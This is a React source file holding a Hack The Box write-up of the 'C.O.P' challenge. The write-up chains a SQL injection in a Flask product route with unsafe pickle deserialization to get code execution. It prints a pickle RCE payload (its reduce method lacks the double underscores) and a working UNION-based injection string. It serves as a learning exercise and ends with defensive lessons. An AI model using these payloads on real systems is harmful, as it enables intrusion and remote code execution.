import { Link, Typography } from "@mui/material";
import * as React from "react";
import Inline from "~util/InlineCode";
import MultiLine from "~util/MultiLineCode";
import Quote from "~util/Quote";
import cop1 from "../../img/cop1.png";
import cop2 from "../../img/cop2.png";
import SourcedImage from "~util/SourcedImage";
import Learning from "~util/Learning";
import LinkInternal from "~util/LinkInternal";
import { useNavigate } from "react-router-dom";

export const WriteupsCOP = {
    path: "cop",
    title: "C.O.P",
    chalAuth: "InfoSecJack",
    chalAuthLink: "https://app.hackthebox.com/users/52045",
    tags: [
        "Easy",
        "@Flask",
        "@SQLite3",
        "SQL Injection",
        "Unsafe Deserialization",
    ],
    description:
        "An exploit chain involving injecting malicious serialized objects into a trusted database.",
    reflection: () => {
        const navigate = useNavigate();
        return (
            <>
                <Typography>
                    I was pretty happy with this challenge - it didn't feel too
                    easy, but at the same time it didn't lead to any messy
                    rabbit holes and I got to use SQL injection, which is always
                    fun.
                </Typography>
                <Learning title="Railroad diagrams are amazing for SQL injection">
                    Not the deepest learning from this challenge, but using
                    SQLite3 railroad diagrams is such an easy way to tell where
                    you are in a SQL statement. It's so clear what you can add
                    onto the statement and what you can't, and is so much better
                    than obscure EBNF expressions which take forever to mentally
                    parse.
                </Learning>
                <Learning dev title="Don't trust your database!">
                    While I think that after{" "}
                    <LinkInternal nav={navigate} url="./../toxic">
                        Toxic
                    </LinkInternal>{" "}
                    I probably wouldn't deserialize any user input directly, I
                    think that this challenge really shows that we can't
                    necessarily trust what's in our database. Unless you know
                    every possible place that's writing to it, you can't assume
                    that its contents are safe to be deserialized, or unsafely
                    injected into a template, or anything else like that.
                    <br />
                    <br />
                    Basically, database contents should probably be treated just
                    like any other user input vector - carefully and with proper
                    sanitation.
                </Learning>
            </>
        );
    },
    article: () => {
        return (
            <>
                <Typography>
                    Applying our basic first steps, I start the Docker container
                    and start digging around the Dockerfile and source code. The
                    project looks like a fairly typical Flask server - nothing
                    too fancy. We have templates, so maybe template injection is
                    possible. My next step is to figure out the attack vectors -
                    it seems like the only user input I can provide is the
                    product ID into the API{" "}
                    <Inline>{`/view/<product_id>`}</Inline> route.
                </Typography>
                <SourcedImage src={cop2} height="40vh" />
                <MultiLine language="py">{`@web.route('/view/<product_id>')
def product_details(product_id):
    return render_template('item.html', product=shop.select_by_id(product_id))`}</MultiLine>
                <Typography>
                    Having a single attack vector really narrows down what I'm
                    looking for, and we can follow this thread to see what
                    exploitable code is called when we change the product ID.
                    Firstly, we call the <Inline>select_by_id</Inline> function
                    in the shop object. What does that do?
                </Typography>
                <MultiLine language="py">{`def select_by_id(product_id):
    return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)`}</MultiLine>
                <Typography>
                    This looks like a SQL injection, since we have the tell-tale
                    format string. Just to check, what does this{" "}
                    <Inline>query_db</Inline> function do?
                </Typography>
                <MultiLine language="py">{`with app.app.app_context():
    cur = get_db().execute(query, args)
    rv = [dict((cur.description[idx][0], value) for idx, value in enumerate(row)) for row in cur.fetchall()]
    return (next(iter(rv[0].values())) if rv else None) if one else rv`}</MultiLine>
                <Typography>
                    Yep, that's injection. The <Inline>one=True</Inline> from
                    the <Inline>query_db</Inline> call seems to cause only a
                    single row to be returned. Having done a few SQL injections
                    previously, one of the best way to go about this that I
                    found was using the SQLite3 documentation for commands.
                </Typography>
                <SourcedImage
                    src={cop1}
                    height="70vh"
                    sourceName="SQLite3 documentation"
                    sourceLink="https://www.sqlite.org/lang_select.html"
                />
                <Typography>
                    The railroad diagram allows us to see that we can turn this
                    into a compound <Inline>SELECT</Inline> statement by adding
                    a <Inline>UNION</Inline> or <Inline>JOIN</Inline> clause -
                    and, what's more interesting, we can <Inline>UNION</Inline>{" "}
                    literal values rather than having to actually select data
                    from the database. This means that I should be able to make
                    function return whatever I want. Now to check what these
                    database values are used for - the easiest way to do this is
                    to look at what sort of existing data is in the database.
                </Typography>
                <Typography>
                    In <Inline>database.py</Inline> the{" "}
                    <Inline>migrate_db</Inline> function is called to load
                    initial data into the database. The function does some super
                    dodgy-looking stuff, pickling (serialising) some sample data
                    and then base64 encoding it, before putting that into the
                    table in the data column.
                </Typography>
                <MultiLine language="py">{`shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
get_db().cursor().executescript(f.read().format(*list(shop)))`}</MultiLine>
                <Typography>
                    So if I control this encoded data, then I control what's
                    being deserialized on the other end, which means we have an
                    unsafe deserialisation vulnerability. Just to confirm this,
                    I also looked for where that's happening, and we find it in
                    the template code, which injects the unpickled objects:{" "}
                    <Inline>{`{% set item = product | pickle %}`}</Inline>.
                </Typography>
                <Typography>
                    We essentially want a Python unpickle payload, which we can
                    look for on Google and adapt to our needs. I based mine on{" "}
                    <Link
                        href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd"
                        target="_blank"
                    >
                        this one
                    </Link>{" "}
                    with some frills removed. Running this script locally gave
                    me my payload data.
                </Typography>
                <MultiLine language="py">{`import pickle
import sys
import base64

class PickleRce(object):
    def reduce(self):
        import os
        return (os.system,("echo hello rce",))

        print(base64.b64encode(pickle.dumps(PickleRce())))`}</MultiLine>
                <Typography>
                    Now that I had all the pieces in place, I needed to actually
                    perform the exploit. However, I ran into issues with the
                    simple payload I was using because I couldn't get the second
                    quote the be in the correct position. I wanted the query to
                    look something like this.
                </Typography>
                <Inline language="sql">{`SELECT data FROM products WHERE id='1' UNION VALUES ('<payload>')`}</Inline>
                <Typography>
                    There were two issues with this query. Firstly, I needed the
                    last character to be a quote, so that the injection would be
                    valid. Secondly, I needed my <Inline>UNION</Inline>'d value
                    to come before the actual value to ensure that it would be
                    chosen. To do this, I had to go back to do some more
                    research on the SELECT statement syntax. The ideal solution
                    seemed to be by using an <Inline>ORDER BY</Inline> clause to
                    get my injected payload to come first when returned, then
                    using a <Inline>LIMIT '1'</Inline> to ensure that the query
                    ends in a single quote. This would cause my payload to
                    become:
                </Typography>
                <Inline language="sql">
                    {`SELECT data FROM products WHERE id='1' UNION VALUES ('<payload>') ORDER BY data <ASC/DESC> LIMIT '1'`}
                </Inline>
                <Typography>
                    When we remove the parts of the query constructed by the
                    application, we should have:
                </Typography>
                <Inline>{`1' UNION VALUES ('<payload>') ORDER BY data <ASC/DESC> LIMIT '1`}</Inline>
                <Typography>
                    Unfortunately, when I tried using this in my test instance,
                    it didn't work, causing an internal server error. What could
                    be going wrong? I add a debugging statement to the source of
                    the server and resubmit the request. This reveals that I
                    have a syntax error in my SQL statement - how odd. Again we
                    turn back to the documentation, and find this very weird
                    quirk.
                </Typography>
                <Quote
                    sourceName="SQLite3 documentation"
                    sourceLink="https://www.sqlite.org/lang_select.html"
                >
                    In a compound SELECT statement, only the last or right-most
                    simple SELECT may have an ORDER BY clause. That ORDER BY
                    clause will apply across all elements of the compound. If
                    the right-most element of a compound SELECT is a VALUES
                    clause, then no ORDER BY clause is allowed on that
                    statement.
                </Quote>
                <Typography>
                    So basically, I need to make my final select statement a
                    simple <Inline>SELECT</Inline> as well. That gives us this
                    monstrosity of a statement:
                </Typography>
                <MultiLine language="sql">{`SELECT data FROM products WHERE id='1' UNION VALUES ('<payload>') UNION SELECT data FROM products WHERE id='1' ORDER BY data ASC LIMIT '1'`}</MultiLine>
                <Typography>And the corresponding final payload:</Typography>
                <Inline>{`1' UNION VALUES ('<payload>') UNION SELECT data FROM products WHERE id='1' ORDER BY data ASC LIMIT '1`}</Inline>
                <Typography>
                    By modifying the command in my pickled payload, this is able
                    to successfully get RCE on the server, allowing me to{" "}
                    <Inline>ls</Inline> the app directory and{" "}
                    <Inline>mv</Inline> my flag into the static folder, allowing
                    it to be exfiltrated by simply getting the URL.
                </Typography>
            </>
        );
    },
};
